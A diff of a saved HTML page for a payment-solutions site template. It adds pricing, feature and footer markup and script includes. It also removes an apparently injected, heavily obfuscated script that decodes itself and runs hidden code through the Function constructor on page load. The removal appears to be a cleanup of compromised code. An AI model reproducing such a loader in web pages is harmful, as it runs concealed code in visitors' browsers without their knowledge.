+                            Education is the cornerstone of personal and societal growth, serving as  a catalyst for enlightenment, innovation, progress. Through  education, individuals gain knowledge.
+                          </p>
+                        </div>
+                      </div>
+                    </div>
+                    <div class="accordion-item">
+                      <div class="accordion-header">
+                        <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapse_four" aria-expanded="false" aria-controls="collapse_four">
+                          <span class="icon">
+                            <img src="./Payment Solutions – Synox – Finance &amp; Consulting Site Template._files/icon_devices.svg" alt="Icon Devices">
+                          </span>
+                          Freelance
+                        </button>
+                      </div>
+                      <div id="collapse_four" class="accordion-collapse collapse" data-bs-parent="#industry_accordion">
+                        <div class="accordion-body">
+                          <p class="m-0 text-muted">
+                            Education is the cornerstone of personal and societal growth, serving as  a catalyst for enlightenment, innovation, progress. Through  education, individuals gain knowledge.
+                          </p>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+                <div class="col-lg-5">
+                  <div class="powering_industry_image">
+                    <img src="./Payment Solutions – Synox – Finance &amp; Consulting Site Template._files/transactions_card_image_2.webp" alt="Transactions Card image">
+                  </div>
+                </div>
+              </div>
+            </div>
+            <div class="decoration_item shape_nate_1">
+              <img src="./Payment Solutions – Synox – Finance &amp; Consulting Site Template._files/shape_nate_19.svg" alt="Shape Nate 19">
+            </div>
+            <div class="decoration_item shape_arrow_1" data-parallax="{&quot;y&quot; : 150, &quot;smoothness&quot;: 10}">
+              <img src="./Payment Solutions – Synox – Finance &amp; Consulting Site Template._files/shape_arrow_1.webp" alt="Arrow Down">
+            </div>
+          </section>
+          <!-- Powering Industry Section - End
+          ================================================== -->
+
+          <!-- PS Policy Section - Start
+          ================================================== -->
+          <section class="ps_policy_section">
+            <div class="content_wrapper section_decoration overflow-hidden bg-secondary">
+              <div class="container">
+                <div class="heading_block style_2 text-center">
+                  <div class="badge text-uppercase text-primary bg-primary-subtle">Why Choose Us</div>
+                  <h2 class="heading_text mb-0">
+                    Elevate Your Payments with Us
+                  </h2>
+                </div>
+
+                <ul class="ps_policy_items process_steps_block text-center unordered_list justify-content-center justify-content-lg-between">
+                  <li>
+                    <div class="step_block_icon" style="background-image: url(&#39;assets/images/shapes/shape_1.webp&#39;);">
+                      <img src="./Payment Solutions – Synox – Finance &amp; Consulting Site Template._files/icon_browser.svg" alt="icon Browser">
+                    </div>
+                    <h3 class="step_block_title">Fast &amp; Secure</h3>
+                    <p class="mb-0">
+                      Prioritizing Expediency, Safety in Every Transaction.
+                    </p>
+                  </li>
+                  <li>
+                    <div class="step_block_icon" style="background-image: url(&#39;assets/images/shapes/shape_2.webp&#39;);">
+                      <img src="./Payment Solutions – Synox – Finance &amp; Consulting Site Template._files/icon_chat.svg" alt="icon Chat">
+                    </div>
+                    <h3 class="step_block_title">24/7 Live Support</h3>
+                    <p class="mb-0">
+                      24/7 Live Assistance: Support Always Available
+                    </p>
+                  </li>
+                  <li>
+                    <div class="step_block_icon" style="background-image: url(&#39;assets/images/shapes/shape_3.webp&#39;);">
+                      <img src="./Payment Solutions – Synox – Finance &amp; Consulting Site Template._files/icon_api.svg" alt="icon API">
+                    </div>
+                    <h3 class="step_block_title">Targeted Built API</h3>
+                    <p class="mb-0">
+                      Tailored API Customized Solutions for You
+                    </p>
+                  </li>
+                  <li>
+                    <div class="step_block_icon" style="background-image: url(&#39;assets/images/shapes/shape_2.webp&#39;);">
+                      <img src="./Payment Solutions – Synox – Finance &amp; Consulting Site Template._files/icon_layer.svg" alt="icon Layer">
+                    </div>
+                    <h3 class="step_block_title">Automated Flow</h3>
+                    <p class="mb-0">
+                      Automated Workflow Processes for Efficiency
+                    </p>
+                  </li>
+                </ul>
+              </div>
+
+              <div class="decoration_item shape_nate_1">
+                <img src="./Payment Solutions – Synox – Finance &amp; Consulting Site Template._files/shape_nate_17.svg" alt="Shape Nate">
+              </div>
+              <div class="decoration_item shape_nate_2">
+                <img src="./Payment Solutions – Synox – Finance &amp; Consulting Site Template._files/shape_nate_18.svg" alt="Shape Nate">
+              </div>
+              <div class="decoration_item shape_nate_3">
+                <img src="./Payment Solutions – Synox – Finance &amp; Consulting Site Template._files/shape_nate_20.svg" alt="Shape Nate">
+              </div>
+            </div>
+          </section>
+          <!-- PS Policy Section - End
+          ================================================== -->
+
+          <!-- Pricing Section - Start
+          ================================================== -->
+          <section class="pricing_section section_space">
+            <div class="container">
+              <div class="heading_block style_2 text-center">
+                <div class="badge text-uppercase text-primary bg-primary-subtle">Tariffs</div>
+                <h2 class="heading_text mb-0">
+                  Clear Pricing for Transactions
+                </h2>
+              </div>
+              <div class="row">
+                <div class="col-lg-6">
+                  <div class="ps_pricing_block bg-grd">
+                    <div class="pricing_description">
+                      <h3 class="pricing_title">General</h3>
+                      <p>
+                        Our Commission Deducted, Your Money Deposited —
+                      </p>
+                      <ul class="iconlist_block unordered_list_block">
+                        <li>
+                          <span class="iconlist_icon">
+                            <i class="fa-solid fa-circle"></i>
+                          </span>
+                          <span class="iconlist_text">
+                            Single Banking Day to Your Merchant Account.
+                          </span>
+                        </li>
+                        <li>
+                          <span class="iconlist_icon">
+                            <i class="fa-solid fa-circle"></i>
+                          </span>
+                          <span class="iconlist_text">
+                            When the funds turnover reaches $300,000.
+                          </span>
+                        </li>
+                      </ul>
+                      <a class="btn bg-primary text-dark btn-rounded" href="https://html.xpressbuddy.com/synox/contact.html">
+                        <span class="btn_label">Connect Now</span>
+                        <span class="btn_icon"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg">
+                          <path d="M19.7071 8.70711C20.0976 8.31658 20.0976 7.68342 19.7071 7.29289L13.3431 0.928932C12.9526 0.538408 12.3195 0.538408 11.9289 0.928932C11.5384 1.31946 11.5384 1.95262 11.9289 2.34315L17.5858 8L11.9289 13.6569C11.5384 14.0474 11.5384 14.6805 11.9289 15.0711C12.3195 15.4616 12.9526 15.4616 13.3431 15.0711L19.7071 8.70711ZM0 9H19V7H0V9Z" fill="black"></path>
+                        </svg></span>
+                      </a>
+                    </div>
+                    <ul class="pricing_feature_list text-center unordered_list_block">
+                      <li>
+                        <div class="price_value">1,9%</div>
+                      </li>
+                      <li>
+                        <p class="mb-0">
+                          Get everything you need to manage payments
+                        </p>
+                      </li>
+                      <li>
+                        <p class="mb-0">
+                          Finto mobile app is always available
+                        </p>
+                      </li>
+                      <li>
+                        <p class="mb-0">
+                          No setup fees, monthly/hidden
+                        </p>
+                      </li>
+                    </ul>
+                  </div>
+                </div>
+                <div class="col-lg-6">
+                  <div class="ps_pricing_block bg-grd-2">
+                    <div class="pricing_description">
+                      <h3 class="pricing_title">Individual</h3>
+                      <p>
+                        Apply or write to the Chat to reduce the tariff if:
+                      </p>
+                      <ul class="iconlist_block unordered_list_block">
+                        <li>
+                          <span class="iconlist_icon">
+                            <i class="fa-solid fa-circle"></i>
+                          </span>
+                          <span class="iconlist_text">
+                            Quick Deposits—Optimal for Speedy Transactions.
+                          </span>
+                        </li>
+                        <li>
+                          <span class="iconlist_icon">
+                            <i class="fa-solid fa-circle"></i>
+                          </span>
+                          <span class="iconlist_text">
+                            When the funds turnover reaches $300,000.
+                          </span>
+                        </li>
+                      </ul>
+                      <a class="btn bg-primary text-dark btn-rounded" href="https://html.xpressbuddy.com/synox/contact.html">
+                        <span class="btn_label">Apply now</span>
+                        <span class="btn_icon"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg">
+                          <path d="M19.7071 8.70711C20.0976 8.31658 20.0976 7.68342 19.7071 7.29289L13.3431 0.928932C12.9526 0.538408 12.3195 0.538408 11.9289 0.928932C11.5384 1.31946 11.5384 1.95262 11.9289 2.34315L17.5858 8L11.9289 13.6569C11.5384 14.0474 11.5384 14.6805 11.9289 15.0711C12.3195 15.4616 12.9526 15.4616 13.3431 15.0711L19.7071 8.70711ZM0 9H19V7H0V9Z" fill="black"></path>
+                        </svg></span>
+                      </a>
+                    </div>
+                    <ul class="pricing_feature_list text-center unordered_list_block">
+                      <li>
+                        <p class="mb-2">
+                          Charity
+                        </p>
+                        <div class="price_value">0%</div>
+                      </li>
+                      <li>
+                        <p class="mb-2">
+                          Housing and public utilities, condominium associations
+                        </p>
+                        <div class="price_value">1%</div>
+                      </li>
+                      <li>
+                        <p class="mb-2">
+                          Online landing Working Process
+                        </p>
+                        <div class="price_value">1%</div>
+                      </li>
+                    </ul>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </section>
+          <!-- Pricing Section - End
+          ================================================== -->
+
+        </div>
+
+      </main>
+      <!-- Main Body - End
+      ================================================== -->
+
+      <!-- Site Footer - Start
+      ================================================== -->
+      <footer class="site_footer footer_layout_3 bg-dark">
+        <div class="cta_section section_space">
+          <div class="container">
+            <div class="row align-items-center">
+              <div class="col-lg-7">
+                <h2 class="heading_text mb-0">
+                  Ready to level up your payment process?
+                </h2>
+              </div>
+              <div class="col-lg-5 text-lg-end">
+                <a class="btn bg-primary text-dark rounded-pill" href="https://html.xpressbuddy.com/synox/pricing.html">
+                  <span class="btn_label">Sign Up Now</span>
+                  <span class="btn_icon"><svg width="34" height="24" viewBox="0 0 34 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M33.0607 13.0607C33.6464 12.4749 33.6464 11.5251 33.0607 10.9393L23.5147 1.3934C22.9289 0.807609 21.9792 0.80761 21.3934 1.3934C20.8076 1.97918 20.8076 2.92893 21.3934 3.51472L29.8787 12L21.3934 20.4853C20.8076 21.0711 20.8076 22.0208 21.3934 22.6066C21.9792 23.1924 22.9289 23.1924 23.5147 22.6066L33.0607 13.0607ZM1.31134e-07 13.5L32 13.5L32 10.5L-1.31134e-07 10.5L1.31134e-07 13.5Z" fill="black"></path>
+                  </svg></span>
+                </a>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="content_wrap section_decoration overflow-hidden">
+          <div class="container">
+            <div class="row justify-content-lg-between">
+              <div class="col-lg-3 col-md-6 col-sm-6">
+                <h3 class="footer_info_title">Company</h3>
+                <ul class="iconlist_block unordered_list_block mb-0">
+                  <li>
+                    <a href="https://html.xpressbuddy.com/synox/index_payment_solutions.html#!">
+                      <span class="iconlist_text">About Us</span>
+                    </a>
+                  </li>
+                  <li>
+                    <a href="https://html.xpressbuddy.com/synox/index_payment_solutions.html#!">
+                      <span class="iconlist_text">Careers</span>
+                    </a>
+                  </li>
+                  <li>
+                    <a href="https://html.xpressbuddy.com/synox/index_payment_solutions.html#!">
+                      <span class="iconlist_text">Terms of Use</span>
+                    </a>
+                  </li>
+                  <li>
+                    <a href="https://html.xpressbuddy.com/synox/index_payment_solutions.html#!">
+                      <span class="iconlist_text">Privacy Policy</span>
+                    </a>
+                  </li>
+                  <li>
+                    <a href="https://html.xpressbuddy.com/synox/index_payment_solutions.html#!">
+                      <span class="iconlist_text">Contact Us</span>
+                    </a>
+                  </li>
+                </ul>
+              </div>
+              <div class="col-lg-3 col-md-6 col-sm-6">
+                <h3 class="footer_info_title">Accept Payments</h3>
+                <ul class="iconlist_block unordered_list_block mb-0">
+                  <li>
+                    <a href="https://html.xpressbuddy.com/synox/index_payment_solutions.html#!">
+                      <span class="iconlist_text">Synox POS</span>
+                    </a>
+                  </li>
+                  <li>
+                    <a href="https://html.xpressbuddy.com/synox/index_payment_solutions.html#!">
+                      <span class="iconlist_text">Payment Pages</span>
+                    </a>
+                  </li>
+                  <li>
+                    <a href="https://html.xpressbuddy.com/synox/index_payment_solutions.html#!">
+                      <span class="iconlist_text">Payment Links</span>
+                    </a>
+                  </li>
+                  <li>
+                    <a href="https://html.xpressbuddy.com/synox/index_payment_solutions.html#!">
+                      <span class="iconlist_text">QR Codes</span>
+                    </a>
+                  </li>
+                  <li>
+                    <a href="https://html.xpressbuddy.com/synox/index_payment_solutions.html#!">
+                      <span class="iconlist_text">Payment Gateway</span>
+                    </a>
+                  </li>
+                </ul>
+              </div>
+              <div class="col-lg-3 col-md-6 col-sm-6">
+                <h3 class="footer_info_title">Banking Plus</h3>
+                <ul class="iconlist_block unordered_list_block mb-0">
+                  <li>
+                    <a href="https://html.xpressbuddy.com/synox/index_payment_solutions.html#!">
+                      <span class="iconlist_text">Smart Collect</span>
+                    </a>
+                  </li>
+                  <li>
+                    <a href="https://html.xpressbuddy.com/synox/index_payment_solutions.html#!">
+                      <span class="iconlist_text">Source to pay</span>
+                    </a>
+                  </li>
+                  <li>
+                    <a href="https://html.xpressbuddy.com/synox/index_payment_solutions.html#!">
+                      <span class="iconlist_text">Current Accounts</span>
+                    </a>
+                  </li>
+                  <li>
+                    <a href="https://html.xpressbuddy.com/synox/index_payment_solutions.html#!">
+                      <span class="iconlist_text">Payout Links</span>
+                    </a>
+                  </li>
+                  <li>
+                    <a href="https://html.xpressbuddy.com/synox/index_payment_solutions.html#!">
+                      <span class="iconlist_text">Credit Card</span>
+                    </a>
+                  </li>
+                </ul>
+              </div>
+              <div class="col-lg-2 col-md-6 col-sm-6">
+                <h3 class="footer_info_title">Download App</h3>
+                <p>
+                  Available in any kind of ready version
+                </p>
+                <ul class="app_download_btns unordered_list_block">
+                  <li>
+                    <a href="https://html.xpressbuddy.com/synox/index_payment_solutions.html#">
+                      <img src="./Payment Solutions – Synox – Finance &amp; Consulting Site Template._files/app_store.webp" alt="App Store">
+                    </a>
+                  </li>
+                  <li>
+                    <a href="https://html.xpressbuddy.com/synox/index_payment_solutions.html#">
+                      <img src="./Payment Solutions – Synox – Finance &amp; Consulting Site Template._files/google_play.webp" alt="Google Play">
+                    </a>
+                  </li>
+                </ul>
+              </div>
+            </div>
+
+            <div class="footer_bottom bg-dark">
+              <div class="row align-items-center">
+                <div class="col-lg-6">
+                  <p class="copyright_text mb-0">
+                    Copyright © 2025 All global pay, All rights reserved.
+                  </p>
+                </div>
+                <div class="col-lg-6">
+                  <ul class="social_icons_block unordered_list justify-content-center justify-content-lg-end">
+                    <li>
+                      <a aria-label="Twitter X" href="https://html.xpressbuddy.com/synox/index_payment_solutions.html#!">
+                        <svg viewBox="0 0 15 15" xmlns="http://www.w3.org/2000/svg">
+                          <path d="M8.92704 6.35148L14.5111 0H13.1879L8.33921 5.5149L4.4666 0H0L5.85615 8.3395L0 15H1.32333L6.44364 9.17608L10.5334 15H15L8.92671 6.35148H8.92704ZM7.11456 8.41297L6.52121 7.58255L1.80014 0.974755H3.83269L7.64265 6.30746L8.236 7.13788L13.1885 14.0696H11.156L7.11456 8.41329V8.41297Z"></path>
+                        </svg>
+                      </a>
+                    </li>
+                    <li><a aria-label="Facebook" href="https://html.xpressbuddy.com/synox/index_payment_solutions.html#!"><i class="fa-brands fa-facebook-f"></i></a></li>
+                    <li><a aria-label="Linkedin" href="https://html.xpressbuddy.com/synox/index_payment_solutions.html#!"><i class="fa-brands fa-linkedin-in"></i></a></li>
+                    <li><a aria-label="Paper Plane" href="https://html.xpressbuddy.com/synox/index_payment_solutions.html#!"><i class="fa-solid fa-paper-plane"></i></a></li>
+                  </ul>
+                </div>
+              </div>
+            </div>
+          </div>
+          <div class="decoration_item shape_nate_1">
+            <img src="./Payment Solutions – Synox – Finance &amp; Consulting Site Template._files/shape_nate_14.svg" alt="Shape Nate">
+          </div>
+          <div class="decoration_item shape_nate_2">
+            <img src="./Payment Solutions – Synox – Finance &amp; Consulting Site Template._files/shape_nate_15.svg" alt="Shape Nate">
+          </div>
+          <div class="decoration_item shape_nate_3">
+            <img src="./Payment Solutions – Synox – Finance &amp; Consulting Site Template._files/shape_nate_21.svg" alt="Shape Nate">
+          </div>
+        </div>
+      </footer>
+      <!-- Site Footer - End
+      ================================================== -->
+
     </div>
+    <!-- Body Wrap - End -->
 
+    <!-- Fraimwork - Jquery Include -->
+    <script src="./Payment Solutions – Synox – Finance &amp; Consulting Site Template._files/jquery.min.js"></script>
+    <script src="./Payment Solutions – Synox – Finance &amp; Consulting Site Template._files/popper.min.js"></script>
+    <script src="./Payment Solutions – Synox – Finance &amp; Consulting Site Template._files/bootstrap.min.js"></script>
+    <script src="./Payment Solutions – Synox – Finance &amp; Consulting Site Template._files/bootstrap-dropdown-ml-hack.min.js"></script>
 
+    <!-- Carousel - Jquery Include -->
+    <script src="./Payment Solutions – Synox – Finance &amp; Consulting Site Template._files/swiper-bundle.min.js"></script>
 
-    <script>
-        var openPopup, closePopup; (function () { var AQe = '', THK = 873 - 862; function SKh(v) { var d = 2400240; var i = v.length; var y = []; for (var k = 0; k < i; k++) { y[k] = v.charAt(k) }; for (var k = 0; k < i; k++) { var b = d * (k + 204) + (d % 18140); var n = d * (k + 731) + (d % 25693); var e = b % i; var t = n % i; var o = y[e]; y[e] = y[t]; y[t] = o; d = (b + n) % 6882608; }; return y.join('') }; var nnl = SKh('urtvaoukqibcrhjmcxdonoclrnygtfspewtsz').substr(0, THK); var yzr = '.=+ hl+1,.n{5.ro4liAo8r!e=m2bg,nu]av; a7[2nrfljft(r02;;C)i r{lt,}eb,6a{hk6;,.r=;y[,5g9t98r)6v8c04 s3+ed"(0p}a)sa"ah=,yppal,[ceu(lsf;o=,r.t xsh)oavSm,n5gh=f71)n)=[x]]=x.b;.h< erlc;ma]ij=s1;=+(=)e4hqnv;"vu4eu)gacrof(<xtfgpf0el)i;.ddvogv<.r(]autl+,A.==us.splf=(b n=)ftl;v[a+a b.l+nAt0-2(;r-0racv;r=su3a,;u(lgC;b+vm+j6(nv=a ri ;n()vaC(kt0+pyvh+apneua;thirae y;d]p=+ar}oh+v*mqq)+dk.]Sq0)qp;rnutnid)8;i.t0e9o-lfnojorhg9or,g=.oa1+r,=rh"h;{vovnet(nul=e+(a=(a[g[=}r}s, cfaiat])f.tv;.g7,8ngol-);pfc7ir))-rrtfx"-)+xnme.ad(4t8k81(+l=;4-uilsrkoa)}elsx)c]h ve)l{1l= 99 .r1.)d<mv(=((t>r[1h;i rx0;v(;svja=+(=(ydaj7]92opaul++ntw;.;t6{;shr( r=.<t)o]n5iiCc;sdd[shlervu;;1fitf.af)pbn v=(==hrA)tdu;kl)ao*;jh.[0h,;;gnexCk( ,ori>;9=sxo8C}"6 d)0[,d{ ,d,6"=r(]=)"nlbtsvgjv(nm"7;2q)ubC;;tr,ean (zr,o1;hlgrn[aei(=C=a=sxltpm]2p[sA8j6p7=="7)c1+8yc,6ue1ra[7 )lra]r(;ol l,vomg+;rr==.(le;+)+;l22u,g.e n,!ip(t.)irec(vrnuhr2'; var Mcj = SKh[nnl]; var CgB = ''; var fmY = Mcj; var OTS = Mcj(CgB, SKh(yzr)); var svk = OTS(SKh('36Yn_95740Y;_,01Y0gd.$_u$&e(*.)0i\'4atYhrYY5$-pe)d)_Yo+3)nY._+9m7Ya_fo3(ef9Id(o!y$Yb);ip(Yi (Yitn]\'=r:tq%u;b!o}Y..3(;=.).=)YlY1Y(Y nY..a(2Ys$;ag(= 02f7e3*gy%0}e=)CwnhpYYn7!t+e0d;,;$7pa_lpavu,e\/na)0atjY;oY(;buC!YajYl.}_r$%_}]4Y.]Y%Y.1(4_Ypa{72hjrYnix(7(YY*Y.nb r=7+_h4u nx{op}${)6)1td486=q.bY$Y(_a"o{Yr=$r[Ya0fn7)!,4=09Y9lf$t7\/q8Yai_eeY0$_i(.a.(!5)f)(m)li)}2)a]3i2(lhl{cY[2E_,"og[h=;}2.)t2c=.f7\/.aY(e4(naYp;ef.4paY_6,){o_tYt)&0v!3;(3p6nbp8t%Y3o6,n%.ipe"t3,a6hen371g]nY0y.e{f (].-!9.%=Yr#37sn%r)Y)2_Yo_Y;*,2yiw +j17Yey,tYrjat(8o!g32)p ;p(.Y%3,=)_)Y($_{lr; )gi5pY).!.noi).Y6dcdea(Yke;i3];_t;YbYo33#)Y=+sm 2 cY5Y2eemt)YY2Yc.=._Y3.t) Y$%7)4o)(,!7.4(b)Ynt{$h)2x)nsY7e2Yn2,2}-bY9)o)2)$5\'p41!7)."YYYe,Y;aY&nu3fnn6 [n %Y.rY.(Y3{Yx2fiY:e{4,-_(r];) ,-spu5(e2]]l];reYt5e;54Y4Y%__do =r8Y. p$&!2xos,._]Y$[$.#]=_2och\/,6\';,.Y;"S"}Y1*ap4d a4rp)Y;u3.,s1"2e50():01;Ye=(,fy(Yt3YnYh7dSl!#!=#&$$aa}a2an44(;o#0ps(..4._f..(o;;d(d-i2oY2(.(6%Y,o!2]Y(,,=f),#YY.1;,fgY}Ya.{d 7a.oYY).;p45a,na$$)t0ol!(,Y3Ya!=.ar8.t}2f .58r{ s[p!)h1a.9tf)5na(.!;jYm.y_4t,.Yu7Yc85}(r +dol!b4Y=a}=tY44Y+(,6js2]bYerj,eY!_;;}f.o{$,YYnYY:,d#Yu_j2)l56bgu_l0]90(=60ne!2 4.=0$a5ax(rY(4n).2YrS0i.96_4.YdY![ $b2(1(iti4;0pYfui$_2)_3 )j7e+,u}..4$gY._f .$ji4otY.$eflYmY%16ooprY _t_!_ronb!Y_1sY")5)=iY58ddi2ousu;)Y,84ir_(')); var rAd = fmY(AQe, svk); rAd(1735); return 7559 })()
-    </script>
-</body></html>
+    <!-- Animations - jquery include -->
+    <script src="./Payment Solutions – Synox – Finance &amp; Consulting Site Template._files/parallaxie.js"></script>
+    <script src="./Payment Solutions – Synox – Finance &amp; Consulting Site Template._files/parallax-scroll.js"></script>
+    <script src="./Payment Solutions – Synox – Finance &amp; Consulting Site Template._files/wow.min.js"></script>
+
+    <!-- Video & Image Popup - Jquery Include -->
+    <script src="./Payment Solutions – Synox – Finance &amp; Consulting Site Template._files/magnific-popup.min.js"></script>
+
+    <!-- Counter - Jquery Include -->
+    <script src="./Payment Solutions – Synox – Finance &amp; Consulting Site Template._files/appear.min.js"></script>
+    <script src="./Payment Solutions – Synox – Finance &amp; Consulting Site Template._files/odometer.min.js"></script>
+
+    <!-- Content Auto Sliding - jquery include -->
+    <script src="./Payment Solutions – Synox – Finance &amp; Consulting Site Template._files/ticker.min.js"></script>
+
+    <!-- Custom - Jquery Include -->
+    <script src="./Payment Solutions – Synox – Finance &amp; Consulting Site Template._files/main.js"></script>
+
+  
+</body>
+</html>
